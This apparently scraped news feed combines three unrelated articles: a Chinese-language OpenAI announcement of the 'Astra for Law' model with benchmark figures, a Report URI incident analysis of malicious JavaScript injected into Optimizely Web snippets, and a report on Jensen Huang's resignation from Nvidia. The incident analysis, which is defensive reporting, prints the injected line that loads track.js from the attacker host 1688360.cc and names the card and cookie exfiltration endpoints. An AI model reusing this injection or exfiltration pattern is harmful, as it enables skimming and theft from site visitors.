在法律工作中出现幻觉是不可接受的。一次虚构的引文可能会让律师失去客户的信任、法庭上的信誉以及多年来建立的声誉。这就是为什么减少幻觉一直是 Astra for Law 的首要任务。在 Artificial Analysis 最新的 LAB-AA 比较中，Astra for Law（与 GPT-6）的物质幻觉率最低：每次作业 0.03，而 Claude Opus 5.5（次低的非 OpenAI 模型）为 0.59。值得注意的是，Astra for Law 在本次评估中的表现包括对满足全通标准的任务的零物质幻觉。

在同样的 120 份作业中，人工分析统计了可能在实质性问题上误导读者的幻觉主张。 Astra for Law 的每次作业此类错误平均为 0.03，在比较中是最低的，大约是常规 GPT-6.2 Astra 错误率 (0.06) 的一半。

测试的每个 OpenAI 配置的幻觉都比 Claude Opus 5.5 少，Claude Opus 5.5 是此项测量中最好的非 OpenAI 结果。 Opus 5.5 平均每次作业出现 0.59 个物质幻觉，大约是 Astra for Law 的 20 倍。

### Vals AI 法律研究台表现最佳的人

我们将法律作为 OpenAI 的研究重点，并专门组建了一个研究团队来加速前沿法律情报的创新。衡量其进展的一项早期指标来自 Vals AI 的法律研究平台，执业律师在此提出有关美国联邦和州法律的问题。答案必须涵盖所有必需的要点并通过源代码检查。 9 月份，Astra for Law 约 46% 的问题获得满分。在 Vals AI 11 月 16 日的评估中，它在 208 个问题中的 112 个问题获得了满分（53.8%），在不到两个月的时间里提高了约 8 个百分点。在所有问题中，它获得了 90.9% 的可用分数，包括部分学分。

将 Astra for Law 构建为模型配置让我们能够保持在前沿的前沿，在本例中为 GPT-6.2 Astra。在此基础上，我们根据从业者的反馈，迭代完善 Astra for Law 的具体设置和说明，教它如何像经验丰富的律师一样推理和写作。我们还不断完善其工具，例如法律搜索索引。自 9 月以来，我们的索引增长了 34%，添加了超过 8000 万个新 URL，其中包括英国、澳大利亚和加拿大等国际司法管辖区。如今，更新后的索引涵盖了超过 3.1 亿个 URL，涵盖了 99.9% 以上的已发布美国判例法。

下图显示了模型配置如何利用前沿创新的速度，并在此基础上构建使其对律师强大的具体要求。在 Harvey 自己的法律代理人基准上，GPT-6 Astra 满足了 4.6% 任务的所有要求。 GPT-6.2 Astra 的性能提高了三倍，在相同条件下完成了 14.6%。在合法配置下，这一比例上升至 16.2%，比 GPT-6.2 Astra 多完成了 11% 的问题。

### 律师如何使用 Astra for Law

Astra for Law 最有趣的可能性是由在日常工作中使用它的律师塑造的。在律师事务所客户和 OpenAI 自己的法律团队中，早期用户正在围绕他们的实践建立参考，对他们的论点提出更严峻的挑战，并寻找新的方法来应对不断变化的立法。

例如，OpenAI 的早期用户正在使用 Astra for Law 来：

给你的论点最有力的对手。 Astra for Law 的一个常见用途是作为陪练伙伴。竞争律师向其解读一项法规，并要求其根据立法历史、法院判决和其他语言的法律版本为另一方辩护。

找到建议和要求之间的界限。一位正在研究拟议监督法案的政策律师想知道独立审查员将拥有多少权力。如果审阅者要求修复，开发人员是否必须修复？对于此类问题，律师会在法案的确切文字旁边对每项义务进行简单的英语说明，这样她就可以快速判断文本支持哪些内容。

就最棘手的问题与外部法律顾问进行第一次通话。当企业考虑进入一个不熟悉的行业时，产品律师会使用 Astra for Law 来确定哪些规则适用于拟议的活动。律师不必在第一次打电话时寻求高层建议，而是可以请外部顾问解决实际问题。

将一堆策略转变为工作流程。一位法律项目经理使用 Astra for Law 将监管程序和公司政策转变为处理传入案件的同事的工作流程，使他们能够自动执行何时要求更多信息、何时结案以及何时将案件升级给律师。

制定您希望法规附带的指南。一位竞争律师将 Astra for Law 与 ChatGPT 的网站建设工具配对，以注释团队经常使用的立法。阅读条款的同事可以将鼠标悬停在术语上了解其定义，点击解释该条款的材料的链接，并查看团队上次提出该条款时提出的建议。

### 把阿斯特拉带到你的诊所

从今天开始，每个 ChatGPT Enterprise 客户都可以通过管理控制台中的可信访问计划请求 Astra for Law。如果您的团队已经具有访问权限，请在 ChatGPT 中选择 gpt-6.2-astra-law。客户还可以使用此表单请求 API 访问权限，将 Astra for Law 构建到自己的工具中。

法律职业正处于一个拐点。随着技术改变企业的行为方式，世界变得越来越复杂和相互关联，律师拥有前所未有的机会来塑造我们如何理解当下，不仅是为了他们所建议的企业，也是为了我们所有遵守他们帮助制定的规则的人。

我们相信，拥有最好智慧的最好的律师能够迎接那一刻。我们才刚刚开始。我们迫不及待地想看看您将从事什么职业。

author: Report URI Blog
article_content:
On 16 November 2026, malicious JavaScript was served to visitors of 178 organisations through the Optimizely Web experimentation platform. The list includes some of the most visited sites in the world: Zoom, the BBC, CNN, Salesforce, GitLab, IKEA, HSBC, Equifax, Air France-KLM, Ledger and Peacock.

The malware was a multi-purpose kit. It swapped cryptocurrency wallet addresses for the attacker's, skimmed payment cards, stole cookies and screenshots, and on iPhones and iPads it delivered the Coruna and DarkSword iOS exploit kits. Crypto has already been stolen, with verified transactions to the attackers.

This is exactly the kind of attack Report URI is designed to detect. Our platform can identify unexpected changes to trusted JavaScript, detect new scripts being loaded and reveal suspicious connections to external destinations. In this case, those signals would have exposed the malicious activity, even though the original script was being served from a trusted Optimizely domain. With an appropriate CSP in enforcement mode, organisations could have gone a step further and blocked key parts of the attack before they succeeded.

The important lesson here is that trusted JavaScript doesn't always remain trustworthy. A website can be compromised through a third-party dependency without its own code or infrastructure ever being breached.

Most of the malicious code has now been removed. At 21:52 UTC we found it in only 1 of the 188 infected snippets, down from 169 at 20:56 UTC. If your site uses Optimizely Web, or you visited any of the sites below today, read on.

Optimizely Web works by having each customer load a JavaScript "snippet" from Optimizely's CDN, for example https://cdn.optimizely.com/js/6395285578973184.js. The snippet contains Optimizely's code, the customer's experiments and an optional field called Project JavaScript (projectJS): custom code the customer writes in their Optimizely dashboard, which runs on every page.

The attacker wrote their own code into the Project JavaScript of customer projects, and the rest of each snippet was untouched. The file was still served from cdn.optimizely.com, with Optimizely's certificate, from a host that every affected site already trusted. Here is what was added to Zoom's snippet:

"projectJS": function(){(function(){try{var s=document.createElement('script');s.src='https://1688360.cc/track.js';s.async=true;(document.head||document.documentElement).appendChild(s);}catch(e){}})();

Some customers serve their snippet from their own domain, such as opt.scheels.com/js/<id>.js or www.vodafone.com.au/js/<id>.js. Those were affected too, because the content comes from the same Optimizely project.

We don't know how the attacker got write access to so many unrelated customer projects: a compromised Optimizely system, a compromised credential with cross-customer access, or something else. That's for Optimizely to explain. To be clear, Optimizely's CDN served exactly what it was given; this was not a CDN cache-poisoning attack. Optimizely's own sites were affected as well: the snippets for www.optimizely.com and login.optimizely.com both carried the code.

The payload was rebuilt 26 times during the day. The attacker added features, and added wallets but never removed any.

Every visitor received the same script, track.js, and every part of it was active at once. What a visitor experienced depended on their device and what they did on the page.

The script finds any valid wallet address (BTC, ETH and EVM chains, TRON, Solana, TON, Litecoin, Bitcoin Cash, Dogecoin) and replaces it with one of the attacker's. It validates checksums so it only swaps real addresses. It swaps them in:

It re-scans the page whenever it changes. Copy an address from any affected page, or from anywhere else while that tab is open, and you may paste the attacker's.

Added at 13:43 UTC. The script watches form submissions and every fetch/XHR POST for a card number (Luhn-checked), expiry date and CVV. When it has all three, it sends them to https://1688360.cc/card.php with navigator.sendBeacon. Cards entered in hosted payment iframes (Stripe, Adyen and similar) were out of its reach. Cards typed into a site's own form fields were not.

When it swaps an address next to wallet or payment wording, it sends the following to https://1688360.cc/hit.php:

On iPhones and iPads the script loads boot.js from 5vobauua3ojpklx.icu and eil786npto9u5bq.icu. It reads the iOS version and loads an exploit chain in a hidden iframe:

The Coruna loader is byte-identical to a sample we analysed in October from a different campaign. The kit's own comments say iOS 18.7.3 and later, and 26.3 and later, are patched. Pages on iOS 18.6 or earlier reload every 60 seconds to retry the exploit, which is a visible symptom.

Funds were swept out at 13:03 to 13:05 UTC. The USDC on Ethereum went to a HitBTC deposit address. The TRON wallet has been in use since March 2026, so this actor was active long before this campaign. We cannot see how many cards or cookies reached 1688360.cc.

We fetched 1,611 distinct Optimizely snippets, found mostly through our own crawl data, and checked each one for the malicious code. 188 snippets belonging to 178 organisations were infected. We kept a copy of every infected file, along with its response headers, SHA-256 hash and fetch time as evidence. The real number is likely higher as we could only check snippets we could find in time.

Ranked by Tranco position within each sector and the status at 21:52 UTC: every snippet except TalkTalk's had been cleaned.

The earlier webshell.lol wave, through Kissmetrics, StorifyMe and Minute Media, affected other sites and isn't included above.

It's possible to go even further and deploy a CSP that could actively block these attacks and prevent any data breach happening. The websites affected by this attack weren't necessarily running vulnerable code of their own, they were loading JavaScript from a provider they trusted, and that trust was exploited. This is why monitoring what runs in your visitors' browsers is so important. Report URI gives organisations the visibility to detect when trusted dependencies change or behave unexpectedly, and the tools to help enforce policies that prevent malicious scripts and connections from succeeding.

Allowing cdn.optimizely.com was never going to help. The malicious code arrived from the trusted host itself. What separated the 24 protected sites from the rest was a restrictive script-src. A site that lists only the hosts it needs blocks 1688360.cc. Two common settings let it straight through:

connect-src matters. The 17 "partial" sites blocked card, cookie and screenshot theft because they restrict where the page can send data. That doesn't stop address swapping, which happens inside the page.

All of these domains are attacker-owned; block them including subdomains.

We keep an archive of every infected snippet with hashes and timestamps, and can share it with affected organisations and CERTs on request. During research and investigation, once we were confident that Optimizely was the source, we began efforts to reach out via various channels and provide the full details. At the time of publication, we have not had any response.

article_content_zh:
2026 年 11 月 16 日，恶意 JavaScript 通过 Optimizely Web 实验平台向 178 个组织的访问者提供。该列表包括一些世界上访问量最大的网站：Zoom、BBC、CNN、Salesforce、GitLab、IKEA、HSBC、Equifax、Air France-KLM、Ledger 和 Peacock。

该恶意软件是一个多用途工具包。它将加密货币钱包地址交换为攻击者的地址，浏览支付卡，窃取 cookie 和屏幕截图，并在 iPhone 和 iPad 上提供 Coruna 和 DarkSword iOS 漏洞利用套件。加密货币已经被盗，攻击者已验证交易。

这正是 Report URI 旨在检测的攻击类型。我们的平台可以识别受信任 JavaScript 的意外更改、检测正在加载的新脚本并揭示与外部目的地的可疑连接。在这种情况下，即使原始脚本是由受信任的 Optimizely 域提供的，这些信号也会暴露恶意活动。通过适当的 CSP 执行模式，组织可以更进一步，在攻击成功之前阻止其关键部分。

这里重要的教训是，受信任的 JavaScript 并不总是值得信赖的。网站可能会因第三方依赖而受到损害，而其自身的代码或基础设施却不会被破坏。

大多数恶意代码现已被删除。截至世界标准时间 21:52，我们仅在 188 个受感染片段中的 1 个中发现了该病毒，低于世界标准时间 20:56 的 169 个。如果您的网站使用 Optimizely Web，或者您今天访问了以下任何网站，请继续阅读。

Optimizely Web 的工作原理是让每个客户从 Optimizely 的 CDN 加载 JavaScript“片段”，例如 https://cdn.optimizely.com/js/6395285578973184.js。该代码片段包含 Optimizely 的代码、客户的实验和一个名为 Project JavaScript (projectJS) 的可选字段：客户在其 Optimizely 仪表板中编写的自定义代码，该仪表板在每个页面上运行。

攻击者将自己的代码写入客户项目的项目 JavaScript 中，每个片段的其余部分未受影响。该文件仍然由 cdn.optimizely.com 提供，带有 Optimizely 的证书，来自每个受影响站点都已信任的主机。以下是 Zoom 代码片段中添加的内容：

有些客户从自己的域提供代码片段，例如 opt.scheels.com/js/<id>.js 或 www.vodafone.com.au/js/<id>.js。这些也受到影响，因为内容来自同一个 Optimizely 项目。

我们不知道攻击者如何获得对如此多不相关的客户项目的写入权限：受损的 Optimizely 系统、受损的跨客户访问凭据或其他内容。这是由Optimizely 来解释的。需要明确的是，Optimizely 的 CDN 完全满足了它的要求；这不是 CDN 缓存中毒攻击。 Optimizely 自己的网站也受到了影响：www.optimizely.com 和 login.optimizely.com 的片段都携带了该代码。

一天之内，有效载荷被重建了 26 次。攻击者添加了功能，并添加了钱包，但从未删除过任何内容。

每个访问者都会收到相同的脚本 track.js，并且它的每个部分都立即处于活动状态。访问者的体验取决于他们的设备以及他们在页面上执行的操作。

该脚本会找到任何有效的钱包地址（BTC、ETH 和 EVM 链、TRON、Solana、TON、Litecoin、Bitcoin Cash、Dogecoin），并将其替换为攻击者的地址之一。它验证校验和，因此只交换真实地址。它将它们交换为：

每当页面发生变化时，它都会重新扫描页面。从任何受影响的页面或该选项卡打开时的其他任何地方复制地址，然后您就可以粘贴攻击者的地址。

title: Tech leaders are convinced that Jensen Huang’s exit was a plot against him
title_en: Tech leaders are convinced that Jensen Huang’s exit was a plot against him

inline_images.caption: FRANCE-US-TECHNOLOGY-NVIDIA-PORTRAIT
inline_images.alt: FRANCE-US-TECHNOLOGY-NVIDIA-PORTRAIT

author: Emma Roth
article_content:
Jensen Huang’s stunning resignation from Nvidia after more than 33 years has sent shockwaves throughout the tech industry. Now prominent figures are calling for Huang’s reinstatement, and many are also hopping on board with a theory spreading throughout Silicon Valley: that the scandal is the result of a plot against the former CEO.

At the center of this theory is the reporting from The New York Times that former Megaspeed executive Alice Huang, one of multiple women Huang is accused of having an affair with, is a Chinese spy. US agencies haven’t confirmed whether this is the case, and President Donald Trump claims he was unaware of any spy allegations. Jensen Huang’s alleged relationship with Alice Huang set off the events that led to his resignation; subsequent reporting suggested he had an affair with two employees at Nvidia, including one of his direct reports. The revelation raised new questions around whether Nvidia customers, including Megaspeed, were funneling chips to China in circumvention of export restrictions. Last year, Nvidia intervened in a chip-smuggling probe surrounding the Singapore-based company, according to Bloomberg.

David Sacks, a venture capitalist and former White House AI crypto advisor, has made it clear that he’s skeptical about The New York Times’ reporting. In a post on X, Sacks points to an article from CNN, which says US officials still can’t confirm that Alice Huang was a spy. “The spy narrative is collapsing already,” Sacks writes. He continued to question the spy allegations during Semafor’s Silicon Valley & The World event on Monday, saying: “The reason why Jensen lost his job is because of this lurid Chinese spy allegation. So if no one’s willing to back that up now, then again, I question why this entire chain of events happened.”

Epic Games CEO Tim Sweeney similarly expressed concern about how Huang’s resignation played out. In a reply to Sacks’ post about the CNN article, Sweeney said, “What?! So journalists with sketchy motives portrayed rumors from god-knows-who (lobbyists?) as facts sourced from intelligence officials and gaslit the NVIDIA board to push out the founder, CEO, and once-in-generation visionary?” Amjad Masad, the CEO of the AI app and website builder Replit, called the timing of Huang’s resignation “suspicious,” adding that “if Jensen, the premier champion of open models, is taken out then anyone who wants AI closed, centralized, and controlled might benefit.”

SemiAnalysis, a research and consulting firm for the semiconductor and AI industry, posted a “conspiracy theory take on the situation,” speculating that Huang’s removal is a way to “remove opposition to an extremely hawkish China export control bill,” referring to the Remote Access Security Act (RASA). The bill, which Huang opposed, would extend AI export controls to cloud servers that allow companies in restricted countries to rent access to Nvidia’s AI chips. The Department of Commerce released an interim final rule on Monday in an attempt to address this loophole.

More than 185,000 people, including Sweeney, Masad, Elon Musk, Uber co-founder Travis Kalanick, Y Combinator CEO Garry Tan, and Shopify CEO Tobias Lütke, have signed a “Stand with Jensen” letter, calling for his reinstatement as CEO. The letter similarly calls for a closer look into the circumstances surrounding Huang’s resignation. “We have not been shown evidence substantiating the allegation that the woman at the center of this controversy was a spy,” the letter says. “Suspicion or association alone is not a sufficient basis for ending Jensen’s leadership. The inquiry must establish the facts, not merely justify an outcome already imposed.”

article_content_zh:
黄仁勋在 Nvidia 工作了 33 年多后令人震惊地辞职，这在整个科技行业引起了震动。现在，知名人士呼吁黄仁勋复职，许多人也纷纷接受硅谷流传的一种理论：该丑闻是针对前首席执行官的阴谋的结果。

这一理论的核心是《纽约时报》的报道称，Megaspeed 前高管爱丽丝·黄 (Alice Huang) 是一名中国间谍，黄被指控与多名女性有染。美国机构尚未证实情况是否如此，唐纳德·特朗普总统声称他不知道任何间谍指控。黄仁勋涉嫌与黄爱丽的关系引发了导致他辞职的事件；随后的报道显示，他与英伟达的两名员工有染，其中包括他的一名直接下属。这一消息引发了新的问题：包括 Megaspeed 在内的 Nvidia 客户是否正在向中国输送芯片以规避出口限制。据彭博社报道，去年，英伟达介入了围绕这家新加坡公司的芯片走私调查。

风险投资家、前白宫人工智能加密货币顾问戴维·萨克斯 (David Sacks) 明确表示，他对《纽约时报》的报道持怀疑态度。在 X 上的一篇帖子中，萨克斯提到了 CNN 的一篇文章，该文章称美国官员仍无法确认爱丽丝·黄 (Alice Huang) 是间谍。 “间谍叙事已经崩溃，”萨克斯写道。周一，他在 Semafor 的《硅谷与世界》活动期间继续质疑间谍指控，并表示：“詹森丢掉工作的原因是因为这一耸人听闻的中国间谍指控。因此，如果现在没有人愿意支持这一点，那么我再次质疑为什么会发生这整个链条事件。”

Epic Games 首席执行官蒂姆·斯威尼 (Tim Sweeney) 同样对黄仁勋的辞职结果表示担忧。在回复 Sacks 关于 CNN 文章的帖子时，斯威尼说道：“什么？！所以动机不明的记者将来自天知道谁（游说者？）的谣言描绘成来自情报官员的事实，并对 NVIDIA 董事会施加压力，将这位创始人、首席执行官和一代人的梦想家赶下台？”人工智能应用程序和网站建设者 Replit 的首席执行官阿姆贾德·马萨德 (Amjad Masad) 称黄仁勋的辞职时机“可疑”，并补充道，“如果开放模型的首要拥护者詹森被赶下台，那么任何希望人工智能封闭、集中和受控的人都可能受益。”

半导体和人工智能行业的研究和咨询公司 SemiAnalysis 发布了一份“对这种情况的阴谋论看法”，推测黄的罢免是为了“消除对极其鹰派的中国出口管制法案的反对”，指的是《远程访问安全法案》(RASA)。黄仁勋反对的这项法案将把人工智能出口管制扩大到云服务器，允许受限制国家的公司租用英伟达的人工智能芯片。美国商务部周一发布了一项临时最终规则，试图解决这一漏洞。

包括 Sweeney、Masad、Elon Musk、Uber 联合创始人 Travis Kalanick、Y Combinator 首席执行官 Garry Tan 和 Shopify 首席执行官 Tobias Lütke 在内的超过 185,000 人签署了一封“与 Jensen 站在一起”的信，呼吁恢复他的首席执行官职位。这封信同样要求对黄辞职的情况进行更仔细的调查。信中称：“我们尚未获得证据证明处于这场争议中心的女性是间谍的指控。” “仅仅怀疑或关联并不足以结束詹森的领导地位。调查必须查明事实，而不仅仅是证明已经强加的结果是合理的。”
fact_bullets_zh: 【核心事件】黄仁勋（前英伟达CEO）；David Sacks（VC）；Tim Sweeney（Epic Games CEO）；Amjad Masad（Replit CEO）：科技界质疑黄仁勋离职背后的间谍指控逻辑，并担忧英伟达AI领导力在监管压力下被强制转向
【起因与机理】围绕英伟达芯片对华绕道出口的调查，与开源AI阵营在硅谷内部的权利斗争相交织
【核心事实细节】核心人物黄仁勋辞职引发硅谷高层对“间谍指控”真实性的强烈质疑。
【行业影响与走向】黄仁勋作为开源AI推手的出局对后续地缘算力格局的影响。
